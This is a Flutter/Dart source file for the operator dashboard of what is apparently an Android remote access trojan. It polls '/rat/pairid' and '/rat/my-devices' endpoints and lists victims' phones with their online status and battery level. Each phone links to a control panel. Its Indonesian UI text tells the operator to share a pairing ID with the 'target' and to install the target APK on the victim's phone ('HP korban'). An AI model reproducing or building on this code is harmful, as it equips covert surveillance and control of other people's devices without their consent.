import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'control_panel.dart';
import 'srv.dart';

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
    super.key,
    this.username = '',
    this.role = '',
    this.sessionKey = '',
  });
  @override
  State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> {
  // ── TEMA: mengikuti dashboard (biru muda / neubrutalism) ──────────────────
  static const Color bgMain = Color(0xFF0A0A0F); // biru muda lembut
  static const Color bgSurface = Color(0xFF14141A);
  static const Color bgCard = Color(0xFF14141A); // biru sangat pucat
  static const Color textMain = const Color(0xFFEDE7F6);
  static const Color textSub = const Color(0xFFB0A8C0);
  static const Color accent = Color(0xFFFF5252); // biru tua accent
  static const Color accentL = Color(0xFFFF5252); // biru cerah
  static const Color onlineClr = Color(0xFF2E7D32); // hijau tua
  static const Color offlineClr = Color(0xFFB71C1C); // merah tua
  static const Color developerClr = Color(0xFF6A1B9A); // ungu developer

  List<dynamic> _visible = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';

  // Role helpers — developer di atas owner
  bool get _isDeveloper => widget.role.toLowerCase() == 'developer';
  bool get _isOwner => widget.role.toLowerCase() == 'owner';
  bool get _isOwnerOrAbove =>
      ['developer', 'owner'].contains(widget.role.toLowerCase());

  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      final pRes = await http
          .get(Uri.parse('${Srv.baseUrl}/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      final dRes = await http
          .get(Uri.parse('${Srv.baseUrl}/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() {
          _loading = false;
          _errorMsg = 'Server error ${dRes.statusCode}';
        });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() {
          _loading = false;
          _errorMsg = body['message'] ?? 'Error';
        });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);

      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) {
          d['online'] = false;
        }
      }

      if (mounted) {
        setState(() {
          _visible = devices;
          _loading = false;
          _errorMsg = null;
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _loading = false;
          _errorMsg = e.toString();
        });
      }
    }
  }

  int get _active => _visible.where((d) => d['online'] == true).length;

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: accent,
      content: const Text('ID berhasil disalin!',
          style: TextStyle(color: Colors.white)),
      duration: const Duration(seconds: 2),
    ));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      body: SafeArea(
        child: Column(children: [
          // ─ Header ──────────────────────────────────────────────────────────
          Container(
            padding: const EdgeInsets.fromLTRB(18, 14, 18, 10),
            decoration: const BoxDecoration(
              color: bgSurface,
              border: Border(bottom: BorderSide(color: Colors.black, width: 2.5)),
            ),
            child: Column(children: [
              Row(children: [
                _statBox('ONLINE', '$_active', const Color(0xFF2E7D32)),
                const Spacer(),
                Column(children: [
                  const Text('DEVICE DASHBOARD',
                      style: TextStyle(
                          color: textMain,
                          fontSize: 11,
                          letterSpacing: 2,
                          fontWeight: FontWeight.bold,
                          fontFamily: 'Orbitron')),
                  Text('@${widget.username}',
                      style: const TextStyle(color: textSub, fontSize: 9)),
                  // Badge role
                  if (widget.role.isNotEmpty) ...[
                    const SizedBox(height: 4),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 8, vertical: 2),
                      decoration: BoxDecoration(
                        color: _isDeveloper
                            ? developerClr.withOpacity(0.15)
                            : accent.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(
                          color: _isDeveloper ? developerClr : accent,
                          width: 1,
                        ),
                      ),
                      child: Text(
                        widget.role.toUpperCase(),
                        style: TextStyle(
                          color: _isDeveloper ? developerClr : accent,
                          fontSize: 8,
                          fontWeight: FontWeight.w800,
                          letterSpacing: 0.8,
                        ),
                      ),
                    ),
                  ],
                ]),
                const Spacer(),
                _statBox('TOTAL', '${_visible.length}', accent),
              ]),

              // ── PairID box ────────────────────────────────────────────────
              if (_pairId.isNotEmpty) ...[
                const SizedBox(height: 10),
                GestureDetector(
                  onTap: _copyPairId,
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(
                        horizontal: 14, vertical: 10),
                    decoration: BoxDecoration(
                      color: bgCard,
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: Colors.black, width: 1.5),
                      boxShadow: const [
                        BoxShadow(
                            color: Colors.black,
                            blurRadius: 0,
                            offset: Offset(3, 3)),
                      ],
                    ),
                    child: Row(children: [
                      const Icon(Icons.link_rounded, color: accent, size: 16),
                      const SizedBox(width: 10),
                      Expanded(
                          child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                            const Text('ID PAIRING (bagikan ke target)',
                                style: TextStyle(
                                    color: textSub,
                                    fontSize: 9,
                                    letterSpacing: 1)),
                            const SizedBox(height: 3),
                            Text(_pairId,
                                style: const TextStyle(
                                    color: accent,
                                    fontSize: 15,
                                    fontWeight: FontWeight.bold,
                                    letterSpacing: 3,
                                    fontFamily: 'monospace')),
                          ])),
                      Column(children: [
                        const Icon(Icons.copy_rounded, color: accent, size: 16),
                        const SizedBox(height: 2),
                        const Text('SALIN',
                            style: TextStyle(color: textSub, fontSize: 8)),
                      ]),
                    ]),
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  _isOwnerOrAbove
                      ? 'Tap untuk menyalin ID • Developer / Owner yang memiliki ID ini'
                      : 'Tap untuk menyalin ID • Hanya Developer / Owner yang memiliki ID ini',
                  style: const TextStyle(color: textSub, fontSize: 9),
                  textAlign: TextAlign.center,
                ),
              ],
            ]),
          ),

          // ─ Error ─────────────────────────────────────────────────────────
          if (_errorMsg != null)
            _banner(Icons.error_rounded, _errorMsg!, Colors.redAccent),

          // ─ Toolbar ───────────────────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 8, 16, 6),
            child: Row(children: [
              Container(
                padding: const EdgeInsets.only(bottom: 2),
                decoration: const BoxDecoration(
                  border: Border(
                      left: BorderSide(color: Colors.black, width: 3.5)),
                ),
                child: const Padding(
                  padding: EdgeInsets.only(left: 8),
                  child: Text('CONNECTED DEVICES',
                      style: TextStyle(
                          color: textMain,
                          fontSize: 11,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 1.5,
                          fontFamily: 'Orbitron')),
                ),
              ),
              const Spacer(),
              GestureDetector(
                onTap: () {
                  setState(() {
                    _loading = true;
                    _errorMsg = null;
                  });
                  _loadAll();
                },
                child: Container(
                  padding: const EdgeInsets.all(6),
                  decoration: BoxDecoration(
                    color: bgSurface,
                    border: Border.all(color: Colors.black, width: 1.5),
                    borderRadius: BorderRadius.circular(6),
                    boxShadow: const [
                      BoxShadow(
                          color: Colors.black,
                          blurRadius: 0,
                          offset: Offset(2, 2))
                    ],
                  ),
                  child: const Icon(Icons.refresh_rounded,
                      color: accent, size: 16),
                ),
              ),
              const SizedBox(width: 8),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.all(6),
                  decoration: BoxDecoration(
                    color: bgSurface,
                    border: Border.all(color: Colors.black, width: 1.5),
                    borderRadius: BorderRadius.circular(6),
                    boxShadow: const [
                      BoxShadow(
                          color: Colors.black,
                          blurRadius: 0,
                          offset: Offset(2, 2))
                    ],
                  ),
                  child: const Icon(Icons.close_rounded,
                      color: Colors.redAccent, size: 16),
                ),
              ),
            ]),
          ),

          // ─ Device Grid ───────────────────────────────────────────────────
          Expanded(
            child: _loading
                ? const Center(child: CircularProgressIndicator(color: accent))
                : _visible.isEmpty
                    ? Center(
                        child: Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Container(
                                padding: const EdgeInsets.all(16),
                                decoration: BoxDecoration(
                                  color: bgSurface,
                                  border: Border.all(
                                      color: Colors.black, width: 1.5),
                                  borderRadius: BorderRadius.circular(12),
                                  boxShadow: const [
                                    BoxShadow(
                                        color: Colors.black,
                                        blurRadius: 0,
                                        offset: Offset(4, 4))
                                  ],
                                ),
                                child: const Icon(
                                    Icons.devices_other_rounded,
                                    color: textSub,
                                    size: 48),
                              ),
                              const SizedBox(height: 14),
                              const Text('NO DEVICES',
                                  style: TextStyle(
                                      color: textMain,
                                      fontWeight: FontWeight.bold,
                                      letterSpacing: 2,
                                      fontSize: 13,
                                      fontFamily: 'Orbitron')),
                              const SizedBox(height: 6),
                              const Text('Belum ada device terhubung',
                                  style:
                                      TextStyle(color: textSub, fontSize: 11)),
                              const SizedBox(height: 20),
                              Container(
                                margin:
                                    const EdgeInsets.symmetric(horizontal: 40),
                                padding: const EdgeInsets.all(14),
                                decoration: BoxDecoration(
                                  color: bgCard,
                                  borderRadius: BorderRadius.circular(10),
                                  border: Border.all(
                                      color: Colors.black, width: 1.5),
                                  boxShadow: const [
                                    BoxShadow(
                                        color: Colors.black,
                                        blurRadius: 0,
                                        offset: Offset(3, 3))
                                  ],
                                ),
                                child: Column(children: [
                                  const Icon(Icons.info_outline_rounded,
                                      color: accent, size: 20),
                                  const SizedBox(height: 8),
                                  const Text('Cara hubungkan device:',
                                      style: TextStyle(
                                          color: textMain,
                                          fontSize: 11,
                                          fontWeight: FontWeight.bold)),
                                  const SizedBox(height: 6),
                                  const Text(
                                      '1. Install APK target di HP korban\n2. Buka APK → masukkan ID Pairing di atas\n3. Device otomatis muncul di sini',
                                      style: TextStyle(
                                          color: textSub, fontSize: 10),
                                      textAlign: TextAlign.center),
                                ]),
                              ),
                            ]))
                    : GridView.builder(
                        padding: const EdgeInsets.fromLTRB(14, 4, 14, 100),
                        gridDelegate:
                            const
SliverGridDelegateWithFixedCrossAxisCount(
                                crossAxisCount: 3,
                                crossAxisSpacing: 8,
                                mainAxisSpacing: 8,
                                childAspectRatio: 0.7),
                        itemCount: _visible.length,
                        itemBuilder: (ctx, i) {
                          final d = _visible[i];
                          final on = d['online'] == true;
                          final sc = on ? onlineClr : offlineClr;
                          return GestureDetector(
                            onTap: () => Navigator.push(
                                ctx,
                                MaterialPageRoute(
                                    builder: (_) => ControlCenterPage(
                                          targetDevice: d,
                                          role: widget.role,
                                        ))),
                            child: Container(
                              padding: const EdgeInsets.all(8),
                              decoration: BoxDecoration(
                                color: bgSurface,
                                borderRadius: BorderRadius.circular(10),
                                border:
                                    Border.all(color: Colors.black, width: 1.5),
                                boxShadow: [
                                  const BoxShadow(
                                      color: Colors.black,
                                      blurRadius: 0,
                                      offset: Offset(3, 3)),
                                  BoxShadow(
                                      color: on
                                          ? onlineClr.withOpacity(0.15)
                                          : accent.withOpacity(0.08),
                                      blurRadius: 8,
                                      offset: const Offset(0, 2)),
                                ],
                              ),
                              child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Row(
                                        mainAxisAlignment:
                                            MainAxisAlignment.spaceBetween,
                                        children: [
                                          const Icon(
                                              Icons.phone_android_rounded,
                                              color: textSub,
                                              size: 13),
                                          Container(
                                            padding: const EdgeInsets.symmetric(
                                                horizontal: 4, vertical: 2),
                                            decoration: BoxDecoration(
                                                color: sc.withOpacity(0.1),
                                                border: Border.all(
                                                    color: sc.withOpacity(0.6),
                                                    width: 1),
                                                borderRadius:
                                                    BorderRadius.circular(5)),
                                            child: Row(children: [
                                              CircleAvatar(
                                                  radius: 2.5,
                                                  backgroundColor: sc),
                                              const SizedBox(width: 3),
                                              Text(on ? 'ON' : 'OFF',
                                                  style: TextStyle(
                                                      color: sc,
                                                      fontSize: 6,
                                                      fontWeight:
                                                          FontWeight.bold)),
                                            ]),
                                          ),
                                        ]),
                                    const Spacer(),
                                    Text(d['model'] ?? 'Unknown',
                                        style: const TextStyle(
                                            color: textMain,
                                            fontSize: 10,
                                            fontWeight: FontWeight.bold),
                                        maxLines: 1,
                                        overflow: TextOverflow.ellipsis),
                                    const SizedBox(height: 2),
                                    Text(d['id'] ?? '-',
                                        style: const TextStyle(
                                            color: textSub, fontSize: 7),
                                        maxLines: 1,
                                        overflow: TextOverflow.ellipsis),
                                    const Spacer(),
                                    Row(children: [
                                      const Icon(
                                          Icons.battery_charging_full_rounded,
                                          color: textSub,
                                          size: 10),
                                      const SizedBox(width: 2),
                                      Text('${d['battery'] ?? '?'}%',
                                          style: const TextStyle(
                                              color: textMain, fontSize: 8)),
                                    ]),
                                  ]),
                            ),
                          );
                        },
                      ),
          ),
        ]),
      ),
    );
  }

  Widget _banner(IconData icon, String msg, Color c) => Container(
        margin: const EdgeInsets.fromLTRB(14, 8, 14, 0),
        padding: const EdgeInsets.all(10),
        decoration: BoxDecoration(
          color: c.withOpacity(0.08),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: Colors.black, width: 1.2),
          boxShadow: const [
            BoxShadow(color: Colors.black, blurRadius: 0, offset: Offset(2, 2))
          ],
        ),
        child: Row(children: [
          Icon(icon, color: c, size: 14),
          const SizedBox(width: 8),
          Expanded(child: Text(msg, style: TextStyle(color: c, fontSize: 11))),
        ]),
      );

  Widget _statBox(String l, String v, Color c) => Column(children: [
        Text(l,
            style: const TextStyle(
                color: textSub, fontSize: 8, letterSpacing: 1)),
        const SizedBox(height: 3),
        Text(v,
            style: TextStyle(
                color: c,
                fontSize: 20,
                fontWeight: FontWeight.bold,
                fontFamily: 'Orbitron')),
      ]);
}